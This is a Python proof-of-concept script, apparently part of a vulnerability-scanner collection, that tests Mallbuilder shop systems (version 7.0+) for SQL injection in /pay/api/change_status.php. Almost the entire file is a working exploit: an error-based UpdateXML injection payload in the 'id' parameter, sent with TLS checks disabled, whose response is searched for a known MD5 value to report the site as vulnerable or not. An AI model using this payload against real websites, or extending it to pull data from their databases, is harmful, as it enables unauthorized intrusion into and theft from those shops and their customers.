#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Mallbuilder商城系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0152481
author: Lucifer
description: 在7.0+版本中,文件位于目录/pay/api/change_status.php,直接拼接参数造成SQL注入。
'''
import sys
import requests
import warnings



class mallbuilder_change_status_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['Mallbuilder商城系统SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/pay/api/change_status.php?id=1%27Or%20UpDaTeXmL%281%2CCoNcAt%280x7e%2C%28SeLeCt%20Md5%281234%29%20LiMit%200%2C1%29%29%2C0%29%20Or%27"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = mallbuilder_change_status_sqli(sys.argv[1])
    testVuln.run()